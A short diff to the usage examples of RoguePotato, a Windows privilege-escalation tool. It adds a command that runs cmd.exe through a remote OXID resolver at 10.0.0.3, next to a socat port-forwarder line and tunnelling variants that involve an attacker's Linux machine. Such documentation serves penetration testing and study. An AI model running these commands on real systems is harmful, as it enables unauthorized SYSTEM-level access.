@@ -27,6 +27,7 @@ Examples:
  - Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
         socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
  - RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.
+        RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
  - RoguePotato using oxid-portal.py reverse tcp Tunnel. You should run oxid-portal.py on attacker's Linux machine before running RoguePotato. Use this if you have fw restrictions.
         RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -b 443
  - RoguePotato all in one with RogueOxidResolver running locally on port 9999
